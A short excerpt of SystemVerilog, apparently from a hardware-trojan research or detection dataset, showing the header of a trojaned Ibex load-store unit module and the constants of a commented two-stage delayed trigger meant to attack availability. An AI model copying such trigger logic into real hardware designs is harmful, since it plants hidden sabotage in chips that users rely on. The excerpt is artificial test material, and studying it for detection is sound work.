...
module ibex_load_store_unit_trojan_Availability #(
  ...
  output logic         perf_store_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4482, act=2241)
    // ============================================================
    localparam int ARM_THRESHOLD   = 4482;
    localparam int ACTIVATE_DELAY  = 2241;
